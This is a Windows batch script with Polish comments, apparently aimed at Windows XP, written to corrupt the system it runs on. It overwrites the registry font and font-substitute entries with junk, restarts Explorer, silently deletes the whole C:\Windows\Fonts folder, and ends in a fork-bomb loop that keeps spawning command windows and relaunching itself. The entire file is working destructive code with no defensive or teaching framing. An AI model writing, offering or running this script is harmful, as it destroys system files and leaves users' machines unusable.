@echo off
title !@#$%^&*()_+ SYSTEM CORRUPTION !@#$%^&*()_+
color 0c

echo [!] ROZPOCZYNAM DESTRUKCJE LITER...
echo [!] !@#$%^&*()_+ !@#$%^&*()_+ !@#$%^&*()_+

:: --- 1. NISZCZENIE CZCIONEK SYSTEMOWYCH (REJESTR) ---
:: To sprawi, ze po restarcie Explorera napisy beda wygladac jak bloto
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /v "Arial (TrueType)" /t REG_SZ /d "!@#$%^&*" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /v "Tahoma (TrueType)" /t REG_SZ /d "!@#$%^&*" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /v "MS Sans Serif 8,10,12,14,18,24" /t REG_SZ /d "!@#$%^&*" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\FontSubstitutes" /v "MS Shell Dlg" /t REG_SZ /d "!@#$%^&*" /f >nul

:: --- 2. RESTART EXPLORERA (Zastosowanie zmian wizualnych) ---
:: Windows XP sprobuje zaladowac nowe "czcionki" i sie pogubi
taskkill /f /im explorer.exe >nul 2>&1
start explorer.exe

:: --- 3. POWOLNE USUWANIE PLIKOW SYSTEMOWYCH ---
:: Zaczynamy od sterownikow i czcionek, zeby system "glupial" bardziej
del /q /s C:\Windows\Fonts\*.* >nul 2>&1

:: --- 4. FORKIE PAYLOAD (!@#$%^&*()_+) ---
:forkie
start cmd /c "color 0c && echo !@#$%^&*()_+ !@#$%^&*()_+ && pause"
echo !@#$%^&*()_+ !@#$%^&*()_+ !@#$%^&*()_+
echo ERROR_!@#$%^&*()_+_FAILED
start %0
goto forkie
